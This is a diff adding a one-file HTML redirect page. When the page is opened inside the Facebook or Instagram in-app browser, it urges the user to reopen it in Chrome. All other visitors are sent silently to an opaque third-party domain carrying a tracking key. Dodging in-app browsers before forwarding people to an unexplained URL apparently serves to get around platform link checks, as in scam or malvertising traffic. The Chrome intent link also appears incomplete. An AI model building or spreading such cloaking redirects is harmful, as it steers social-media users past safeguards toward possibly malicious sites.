@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 40px;
+      background-color: #f7f7f7;
+    }
+    .notice {
+      display: none;
+    }
+    .visible {
+      display: block;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      margin-top: 20px;
+      background-color: #4285F4;
+      color: white;
+      border: none;
+      border-radius: 4px;
+    }
+  </style>
+</head>
+<body>
+  <div id="fbWarning" class="notice">
+    <h2>Open in your browser</h2>
+    <p>For best experience, please open this page in Chrome or your default browser.</p>
+    <button onclick="openInBrowser()">Open in Browser</button>
+  </div>
+
+  <script>
+    function isFacebookApp() {
+      var ua = navigator.userAgent || navigator.vendor || window.opera;
+      return ua.indexOf("FBAN") > -1 || ua.indexOf("FBAV") > -1 || ua.indexOf("Instagram") > -1;
+    }
+
+    function openInBrowser() {
+      window.location.href = "intent://#Intent;scheme=https;package=com.android.chrome;end";
+    }
+
+    // Main redirect logic
+    if (isFacebookApp()) {
+      document.getElementById("fbWarning").classList.add("visible");
+    } else {
+      window.location.href = "https://supersedeasserted.com/jmc60semv?key=d8e44b007f5a4fc5f2e96321aa7bf42c";
+    }
+  </script>
+</body>
+</html>
